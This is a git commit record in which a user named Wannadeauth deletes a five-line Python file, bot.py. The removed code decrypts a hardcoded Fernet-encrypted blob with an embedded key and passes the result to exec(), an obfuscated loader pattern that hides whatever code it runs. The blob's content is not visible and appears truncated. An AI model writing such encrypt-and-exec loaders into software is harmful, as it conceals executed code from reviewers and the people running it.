abf6fc774cf88527422609f3267817acd151dd78
Wannadeauth <63347416+WannaDeauth@users.noreply.github.com>
2020-10-25 20:21:04 +0300

    Delete bot.py

--- bot.py
+++
@@ -1,5 +0,0 @@
-from cryptography.fernet import Fernet
-key = b'kL2R9su7JgLs8T2HN1AXRhI2ETV3cFS-sOC6H7Oz2Oc='
-f = Fernet(key)
-b = b'gAAAAABfGq6xRT7HWWucx21NptZTBd1-D0IvQACm2qheEFQSJlvnbZKK47qBcRP>
-exec(f.decrypt(b))
